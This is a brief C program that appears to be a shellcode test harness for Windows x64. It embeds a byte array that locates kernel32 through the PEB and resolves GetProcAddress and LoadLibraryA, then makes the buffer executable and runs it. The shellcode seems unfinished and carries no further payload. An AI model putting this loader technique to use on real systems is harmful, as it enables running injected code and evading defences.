#include <windows.h>
#include <stdio.h>
char code[] =
"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b\x40\x18\x48\x8b\x70\x20\x48\xad\x48\x96\x48\xad\x48\x8b\x58\x20\x4d\x31\xc0\x44\x8b\x43\x3c\x4c\x89\xc2\x48\x01\xda\x48\x31\xc9\xb1\x88\x48\x01\xd1\x44\x8b\x01\x49\x01\xd8\x48\x31\xf6\x41\x8b\x70\x20\x48\x01\xde\x48\x31\xc9\x49\xb9\x47\x65\x74\x50\x72\x6f\x63\x41\x48\xff\xc1\x48\x31\xc0\x8b\x04\x8e\x48\x01\xd8\x4c\x39\x08\x75\xef\x48\x31\xf6\x41\x8b\x70\x24\x48\x01\xde\x66\x8b\x0c\x4e\x48\x31\xf6\x41\x8b\x70\x1c\x48\x01\xde\x48\x31\xd2\x8b\x14\x8e\x48\x01\xda\x48\x89\xd7\xb9\x61\x72\x79\x41\x51\x48\xb9\x4c\x6f\x61\x64\x4c\x69\x62\x72\x51\x48\x89\xe2\x48\x89\xd9\x48\x83\xec\x30\xff\xd7\x48\x83\xc4\x30\x48\x83\xc4\x10\x48\x89\xc6";
int main(int argc, char** argv)
{
	int (*func)();
	DWORD dwOldProtect;
	printf("Shellcode Length:  %d\n", (int)strlen(code));
	func = (int (*)()) code;
	VirtualProtect(func, sizeof(code), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	(int)(*func)();
}